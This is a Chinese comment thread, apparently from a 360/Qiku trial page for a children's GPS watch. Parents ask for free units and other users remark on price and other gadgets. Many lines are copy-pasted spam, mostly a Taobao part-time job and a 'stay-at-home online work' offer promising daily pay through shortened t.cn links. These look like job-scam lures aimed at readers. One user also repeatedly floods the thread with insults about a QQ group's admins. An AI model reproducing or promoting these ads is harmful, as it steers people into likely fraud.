因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
想要一个给弟弟做生日礼物~~
这个真心不错，希望定价不要太高，现在市面上好的手环都是上千的价格，能控制在千元以内绝对入手的人会很多啊。。。。
想试下一下，看看效果如何，小孩顽皮得很。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
好想有一个,孩子真试过,在游乐场,跑走了
既然是安全类产品，手表类是不是太明显了？如果真是恶性时间，很容易被坏人发现和防范，请真的为孩子和家长设身处地的考虑下，做的尽量隐蔽和比引人注目，此类产品的实际作用应该远大于产品本身的宣传作用比如那个明显的ＧＯＬＯ
360想得很周到。我家女儿还在幼儿园，不可能让带随身手机，现在正是淘气的年龄，写完作业就不知道跑哪里玩去了，虽然都是在一个家属院，有时候挨家挨户的找孩子也不太好，有了这个就好了，随时可以知道孩子在哪里。希望我能申请到~再次谢谢 
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
希望能送给儿子一份实用又有意义的六一礼物，请支持我哦
好喜欢这类东西啊
尼玛，能买得起这玩意灭蚊子的人会担心耗电？
尼玛，能买得起这玩意灭蚊子的人会担心耗电？
好像有一个，孩子才2岁喜欢到处乱跑，马上上幼儿园了，想知道孩子在学校上下学情况。
六一儿童床礼物，不知道能不能实现
今天儿子3周岁！希望有惊喜！
想要一个给弟弟礼物
真的很期待，一直想有款这样的产品。什么时候有售？最好价格亲民，让一般的家庭也用的起，让家人放心。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
在网上看见了这款手表的介绍，儿子一中午没睡觉，就为了等我醒来给他申请手表的试戴，看着 他热切的眼神，我参与了这次活动的申请，真的非常写能申请成功，让他能够满足心愿啊、、、、、、、、
没看明白啊，我买的360随身无线，是插在电脑上的，这个是怎么回事？没看懂啊，为什么还有电池，都是干嘛的？？？
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】.!
好喜欢，开发出来了吗？
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】..
那个流量显示是怎么回事？
后来加我进去，才来得及问一句：刚刚为什么踢我出去。完了，又踢一次！我皮球啊    来让你踢的啊  老周得管管你的人吧   官方群能随随便便的吗  杀头也得给个理由吧    
现在的娃娃喜欢玩，危险特别大，所以我想申请看看好不好，好了可以介绍给其他朋友。
价钱贵了些 不然一定很畅销
奇酷官方试用群 256161928  这群管理员极端的无耻
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】@
奇酷官方试用群 256161928  这群的管理员极端的卑鄙下流
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】#
奇酷官方试用群 256161928 这群的管理员就一头猪
不知是否有设定安全范围功能，比如可以设定超出多少米给大人手机报警功能；此外要考虑儿童佩戴舒适性（曾给孩子戴过儿童手镯，孩子觉得不舒服，后来死活不戴了），另外是否可设计成更隐蔽的方式（纽扣、发卡、儿童鞋等等），万一是其他人拐带，看见孩子手上这么好看又奇怪的手表，还不取走了吗？
 给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
奇酷官方试用群 256161928 这群的管理员      你踢我出来   你拿出来证据   我有不良言论   你举报我啊  公安局网警啊    我发给表情你也踢我   还踢我两回   你家自己的群啊   360是你自己的啊  
哥您还能再逗点么，直不起来就弯了
奇酷官方试用群 256161928   我就问一句    刚刚为什么踢我   哎呀  又给我来一脚    你黄飞鸿啊   佛山无影脚
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】#
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】%
奇酷官方试用群 256161928 里面的管理员   奇葩    我就发个剪刀手的表情  你也踢我     你脑子被毛驴踢了啊    
对于外出的儿童的确有保护作用。但是会不会被一些别有用心的人当做犯罪的工具呢？（恶意跟踪，作案）
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
在北京的人很需要
奇酷官方试用群 256161928 里面的管理员    给我个说法     凭什么踢我    
科幻的感觉
奇酷官方试用群 256161928 管理员   拿出来证据   我干什么啦   我说什么啦   招惹你了  踢我   
很时尚的设计，希望能有一个，免得到处找钥匙了。
感觉和天气瓶类似的功能，电子化了更方便
看这车子 感觉到科技的进步 也感觉到高科技正逐渐走人我们的生活 更感觉到自己的收入的微薄 总的来说东西太贵了 我只能做仰望状 8900 我可以买好2 3款纯电动车了 
奇酷官方试用群 256161928    我等着奇虎出来个人给我个说法
很赞表示，很想要一个
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】#!
宝宝5岁，期待幸运。
要是能给我就好了，那可解决大问题了，帮了我大忙了呢！我儿子那叫一个气人直到现在仍不听话，在路上走着走着只要我们稍有不注意那就不知道跑到哪里去了，并且试过各种方法是规劝是打骂都不好使！而且还喜欢和陌生人说话，一领就走，这两种事情都不知发生多少回了!都不敢带他出门，要是出去玩必须和他爸爸说好先由谁看住孩子！另一个才可以干自己的事！唉！真是愁死人了！要是我们能得到一个那就太高兴了！希望我能得到呢！谢谢!
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】.
喜欢，对于老人和中年人都是不错的健康管理器，希望能尽快见到实物噢。有试用品没有？
很早就想设计这个了，但是我的设计思路与这个略有不同。
希望能送给儿子一份实用又有意义的六一礼物，请支持我哦 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】$
奇酷官方试用群 256161928   官方群是不是   出来个人   给哥个说法
奇酷官方试用群 256161928 管理员给我出来
希望可以使用 
奇酷官方试用群 256161928 管理员给我出来
不如买个摩托车了。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】#
很实用的智能硬件，觉得很不错，希望可以申请到一个，送给儿子，孩子安全，妈妈放心。可以知道孩子的行踪，真是一个很好很有意义的礼物。申请成功后一定好好使用，好好填写使用心得，加以图片好评。
奇酷官方试用群 256161928 管理员给我出来  你们像话吗   残杀无辜
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
缺少对产品性能的描述和建议
奇酷官方试用群 256161928 管理员给我出来   我支持360软件硬件   儿童手表   我招你惹你啦   踢我两次
奇酷官方试用群 256161928 管理员给我出来   六月飞霜  冤枉啊   老周
这辆车子要   多少钱?
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】^
我也想过六一，可是时间不等人 啊 、、、
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】..
不错   看起来很好玩 
很稀饭这个产品，给爸爸妈妈们带来了方便，不用担心宝宝丢了！当然爸爸妈妈们也不能因为有了这款产品而忽略了关注宝宝的一举一动！
申请一个，给家里的小孩
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
宝贝活泼好动，看到了就想要申请一个送给她当礼物，孩子的安全是最重要的。这种产品满足了所有父母的需求！
发广告死全家
 给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
8900 有点贵。。。东西是好东西。。。
奇酷官方试用群 256161928 管理员给我出来六月飞霜 冤枉啊 老周   包青天啊
很漂亮也很喜欢，这车的价格肯定不是一般吧
不看不知道，一看它是宝，值得推广，赞一个。
奇酷官方试用群 256161928 管理员给我出来六月飞霜 冤枉啊 老周 包青天啊   千古奇冤啊
车不错啊！不过太贵啦！
感觉和原来有一种利用手机电磁波发亮的小东西很像！
好想给孩子尝试360全新推出的一款针对儿童安全的定位手表，全方位确保儿童安全，这产品能让爸爸妈妈们放心、安心。真心希望得到此礼物
好喜欢，多少钱？
真好，申请一个，我家小孩就安全多了
奇酷官方试用群 256161928 管理员给我出来    六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊  发个剪刀手就挨踢出来    二进宫问一句：为什么踢我    又来一脚   佛山无影脚   黄飞鸿做管理员啊 
如果 试用效果 好 一会帮忙宣传 
多少钱？？？？
奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
很实用，有了它，妈妈放心了。希望能申请成功，送宝贝一份实用的六一礼物。申请成功后好好分享心得，让更多妈妈觉得选了它就是放心。
奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
尺寸要是小点就好了。
我觉着没用！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
会不会被反控制啊？
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】!
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】~
O(∩_∩)O谢谢奇酷，这样我不怕我家的女儿被人欺负了。
很期待给女儿试用，我女儿今年7岁，由于下班晚有时她自己走回家真的很不放心，谢谢！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】#
好贵的样子，本来想给男朋友买一个的，
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】.
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】%
应该有一个实时通话的功能，然后在儿童回答的时刻进行周边的图片拍摄，可以是很小的一个缩略图，然后在父母手机终端软件可以看到这些个图。
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
我工作经常出差，不能经常在家陪女儿，对女儿很愧疚，每次在外面通手机和她说话感觉很难受，女儿现在上幼儿园了，爷爷奶奶接送每次提醒过马路注意车辆，逛商场注意不要走丢，牵挂担心少不了，看到这款产品不错，有一项和手机互联定位功能吸引了我，如果女儿带上这款手表，出门我也放心多了，所以想试试看功能怎么样，如果我能申请成功，我会极力推荐给身边有孩子的朋友。
有刹车的  玩车的都知道不能靠脚来刹车。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】..
哇。这不是“三傻”里面的那个东东？
能给我就好了，我女儿太顽皮了！我妈根本搞不定她！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
车子不错，价格接受不了，仰望一下吧！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】.!
我想如果我能拿到使用品的话，应该有很多的真实的意见提供给研发人员。我曾经是软件开发人员。
奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
我儿子现年3岁半，平时最怕带他到人多的地方去，男孩子性子野，喜欢乱跑乱玩，看见同年龄的小孩，就追着人家屁股后面和人家玩，每次都伤透脑筋了。奇酷出的这款儿童手表，希望能解决我的这个大问题啊
实用性不怎么样啊
奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊    
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】!
看到心动，希望价钱合理，好喜欢！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
除了在家玩，马路绝对上不了，便道上骑到处是人碰到人就更麻烦。
楼上有一个奇葩咯！ 话说很喜欢这款手表！
我家的4岁龙凤胎，哥哥爱跑动，妹妹懒的动，只有一个老人盯着他们，有时是不知道是追哥哥好，还是守妹妹好。发现360儿童卫士手表可以手机定位，太激动了。希望能申请到两个手表让哥哥妹妹人手一个，这样就解决我们的大问题了！希望能申请到两个！先谢谢先！！如果能申请成功，我们会认真写报告提交报告的，并推荐给其他小朋友家庭。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】#
奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】#
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】%
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】……
价位太高，土豪可以拥有
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
真的不错啊，希望不要太贵啊。
我爱360  我爱儿童手表2  奇酷官方试用群 256161928 奇葩管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
我家娃现在上小学，放学回到家乱跑，爷爷奶奶们根本追不上他，打开360网页看见在申请360儿童卫士手表可以手机定位，鸡冻啦，马上申请了，希望申请成功。。。。。
看上去不错，可以试试
剪刀手无罪   乱踢人道歉             奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊 
自己顶一下吧 顶下伟大的360
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
可以实时了解小孩的方位，而且手机端就可以操作，方便，简捷，孩子的安全是最重要的！还可以六一时，当做儿童节的礼物送给小朋友 ，真心是不错的活动，希望试用成功！
看着不错，但价格缺乏互联网思维
希望这次申领可以通过，也希望奇酷、360能够联合一下，在小县城或者农村搞些活动，毕竟我们这里小孩子的安全问题政府特别不重视，而且一些监控也不完善，导致好多丢孩子，包括孩子被抢的案件没法侦破，希望360能够为社会、为百姓做更多的奉献，大家支持360！
我家孩子现在到处乱跑，爷爷奶奶们根本追不上他，周围环境很乱，很担心，打开360网页看见在申请360儿童卫士手表可以手机定位，马上申请了，希望申请成功
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】 
这款手表比电信出的那款儿童定位手机好多了，而且又方便，那种手机只能内设4个号码，其他都不能用了。期待早些上市，最好价格也要亲民。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】 @
已经申请了！ 不知能不能....╮(╯▽╰)╭
大众消费群体 不能承受住的价格 可以便宜点就好了
我家宝宝是个很皮的男孩子，我家又住在马路边，孩子经常乱跑，让我很忧心，我家电脑上用的所有维护软件还有我的手机上用的维护软件 全都是360的产品，昨天朋友跟我说，现在360有这个儿童卫士手表可以手机定位，现在正在做活动，免费试用，很激动啊，真能真实的接触到360的产品了，很开心，就抱着试试看的态度，想过来申请一个给孩子用，希望360以后的产品，越做越好!(*^__^*)
我的儿子现在太淘气了 一出去就满哪乱跑 看啥都新鲜，打开360网站看到申请儿童卫士手表，这个能给我这个淘气的儿子带来很大的安全性啊，申请个看看 希望我们家宝宝能用上这么科技发达的东西，给我们这些家长一些安全性。
现在好多都需要手机端有个APP，如果脱离手机应该更好吧
剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊  
好喜欢三星啊，希望快点出来！
支持360 支持儿童卫士   剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
可以实时了解小孩的方位，而且手机端就可以操作，方便，简捷，孩子的安全是最重要的！还可以六一时，当做儿童节的礼物送给小朋友 ，真心是不错的活动，希望试用成功！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】.
我申請了,希望能申請到,小孩太頑皮了,老是到處跑.
价格好贵！少一个0，可以接受！
现在还能买吗？？？？求教
我家儿子4岁活泼好动，平时由奶奶带，老人盯着挺累的，惊奇发现360儿童卫士手表，既可以可以手机定位，又可以录音。太好了。希望能申请到手表让，减轻老人负担！希望能申请成功！谢谢360！
价格多少？
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
挺实用的，被朋友抢走了，他很喜欢，每天在用。
 支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
支持360 支持儿童卫士 剪刀手无罪 乱踢人道歉 奇酷官方试用群 256161928 管理员给我出来 六月飞霜 冤枉啊 老周 包青天啊 千古奇冤啊 发个剪刀手就挨踢出来 二进宫问一句：为什么踢我 又来一脚 佛山无影脚 黄飞鸿做管理员啊
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】@
感谢360拥有这样的好东西，给广大群众带来了不少好处！我希望能得到一款！继续支持360！！
